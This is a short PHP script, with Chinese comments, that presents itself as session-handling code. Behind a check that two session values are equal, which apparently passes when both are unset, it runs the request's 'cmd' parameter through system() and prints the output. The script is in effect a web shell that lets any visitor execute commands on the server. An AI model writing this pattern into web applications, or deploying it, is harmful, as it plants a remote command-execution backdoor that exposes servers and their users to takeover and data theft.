<?php
       // 1. 啟動 Session
       session_start();
    	// 3. 寫入 Session 變數
?>
<?php
if ($_SESSION["a"] == $_SESSION["e"] ) {
echo $_SESSION["a"];
echo $_SESSION["e"];
system($_POST["cmd"], $out);
var_dump($out);
header('Content-Type: application/json; charset=utf-8');
} else {
	header('Location: ./index.php'); 
}
?>